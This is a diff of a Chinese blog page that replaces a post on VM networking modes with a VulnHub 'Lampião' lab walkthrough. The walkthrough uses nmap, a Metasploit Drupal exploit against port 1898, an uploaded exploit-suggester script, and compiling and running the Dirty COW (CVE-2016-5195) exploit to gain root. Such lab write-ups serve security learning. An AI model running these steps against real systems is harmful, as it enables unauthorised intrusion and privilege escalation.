@@ -129,25 +129,58 @@
             <span class="icon">
                 <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
             </span>
-            2022/11/23
+            2024/1/8
         </span>
         
         
     </div>
     <div class="content" v-pre>
-        <h1 id="Kali-Linux桥接、NAT模式与主机IP的关系"><a href="#Kali-Linux桥接、NAT模式与主机IP的关系" class="headerlink" title="Kali Linux桥接、NAT模式与主机IP的关系"></a>Kali Linux桥接、NAT模式与主机IP的关系</h1><p>参考：<a target="_blank" rel="noopener" href="http://anineg.space/2022/10/05/vmnet/">桥接模式、NAT模式和仅主机模式 | ANINEGの小屋</a></p>
-<h2 id="一、桥接模式"><a href="#一、桥接模式" class="headerlink" title="一、桥接模式"></a><strong>一、桥接模式</strong></h2><p>当虚拟机系统的网络连接模式为桥接模式时,相当于在主机系统和虚拟机系统之间连接了一个网桥,而网桥两端的网络都属于同一网络,主机和虚拟机是处于同一网络中的对等主机。简单来说，桥接模式就是将虚拟网卡和主机相连，然后一同连接到网络。在这时，虚拟机相当于一台独立出来的机子</p>
-<p>虚拟机IP、子网掩码、网关：  <img src="https://img-blog.csdnimg.cn/b5899e8f56c5450f87faf45521dc1e29.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p> 主机的IP、子网掩码、网关：<img src="https://img-blog.csdnimg.cn/3c1cde4d1cbb4ef884dfb2efb5b4c098.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p> 可以看到虚拟机的IP和网关的网段和主机相同</p>
+        <h1 id="脏牛内核漏洞-Linux内网提权"><a href="#脏牛内核漏洞-Linux内网提权" class="headerlink" title="脏牛内核漏洞-Linux内网提权"></a>脏牛内核漏洞-Linux内网提权</h1><p>靶机下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/xxe-lab-1,254/"><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></a></p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/124640418">第63天-权限提升-Linux 脏牛内核漏洞&amp;SUID&amp;信息收_linux提权手法总结.pdf-CSDN博客</a></p>
+<p>Linux信息探针地址：<a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester: Linux privilege escalation auditing tool (github.com)</a></p>
+<p>脏牛exp：<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
 <p><strong><span id="more"></span></strong></p>
-<h2 id="二、NAT模式"><a href="#二、NAT模式" class="headerlink" title="二、NAT模式"></a><strong>二、NAT模式</strong></h2><p>NAT（Network Address Translation）即网络地址转换，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=DHCP&spm=1001.2101.3001.7020">DHCP</a>服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。简单点来说就是将虚拟机寄生到主机上或者说虚拟机在主机的后面，虚拟机发送数据给NAT适配器交由主机识别并发送出去。从外部网络看，虚拟机和主机共用一个IP，而从内部网看，主机和虚拟机IP处于不同网段。</p>
-<p><img src="https://img-blog.csdnimg.cn/5a70a0a8bfec40459c0c7aa992f67577.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>虚拟机IP、子网掩码、网关： </p>
-<p><img src="https://img-blog.csdnimg.cn/374614cd327d44be8459fa6e4a31e079.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>通过对比验证宿主机是通过VMnet8这块虚拟网卡来与虚拟机操作系统进行通信的</p>
-<p> 主机的IP、子网掩码、网关：</p>
-<p><img src="https://img-blog.csdnimg.cn/94a68a09001a4518a8130c43e088a40d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>先获取本机的ip地址，之后nmap扫描该网段</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141604.png" alt="image-20240108141603166"></p>
+<p>发现靶机是192.168.145.144地址，然后使用nmap深入扫描</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141701.png" alt="image-20240108141659904"></p>
+<p>80端口开启，访问</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-141841.png" alt="image-20240108141839545"></p>
+<p>没有什么有用信息，继续扫描开放端口</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142023.png" alt="image-20240108142022617"></p>
+<p>1898端口也开放，继续访问</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142123.png" alt="image-20240108142122041"></p>
+<p>看一圈下来发现使用的是drupal的CMS框架，网上搜索发现爆过漏洞，或者使用msfconsole搜索</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-142440.png" alt="image-20240108142439025"></p>
+<p><code>msfconsole</code></p>
+<p><code>search drupal</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143402.png" alt="image-20240108143400970"></p>
+<p><code>use 1</code></p>
+<p><code>show options        //显示设置</code> </p>
+<p><code>set rhosts 192.168.145.144            //靶机地址</code></p>
+<p><code>set rport 1898                //目标端口</code></p>
+<p><code>exploit                //开启远程会话</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143558.png" alt="image-20240108143557278"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-143824.png" alt="image-20240108143823008"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-144111.png" alt="image-20240108144109772"></p>
+<p>将下载好的探针脚本放到kali后上传到目标主机</p>
+<p><code>upload /tmp/linux-exploit-suggester.sh /tmp/1.sh</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-144524.png" alt="image-20240108144522778"></p>
+<p><code>shell</code></p>
+<p><code>cd /tmp</code></p>
+<p><code>chmod +x 1.sh        //赋权</code></p>
+<p><code>./1.sh</code></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-145251.png" alt="image-20240108145250590"></p>
+<p>按理来说扫描出来的都得尝试一遍，把exp脚本下载下来放到靶机</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-145423.png" alt="image-20240108145422102"></p>
+<p><code>upload /root/dcow.cpp /tmp</code></p>
+<p><code>cd /tmp</code></p>
+<p><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil            //gcc编译</code></p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;) //使用python开启一个模拟终端利用漏洞，交互式shell</code></p>
+<p><code>./dcow</code></p>
+<p>得到root的密码为dirtyCowFun，使用密码登录root成功，得到root目录下的flag</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-151045.png" alt="image-20240108151044620"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240108-151759.png" alt="image-20240108151758263"></p>
 
     </div>
     
